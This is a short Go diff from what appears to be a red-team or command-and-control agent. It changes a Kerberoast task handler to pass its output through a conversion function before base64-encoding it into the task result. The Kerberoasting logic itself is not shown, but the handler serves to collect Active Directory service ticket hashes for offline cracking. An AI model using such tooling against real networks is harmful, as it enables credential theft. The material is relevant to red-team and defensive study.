@@ -35,7 +35,7 @@ func handleKerberoast(task Task, res *TaskResult) {
 	if err != nil {
 		res.Error = err.Error()
 	} else {
-		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+		res.Output = base64.StdEncoding.EncodeToString([]byte(convertKerberoastResult(out)))
 		res.Encoding = "base64"
 	}
 }
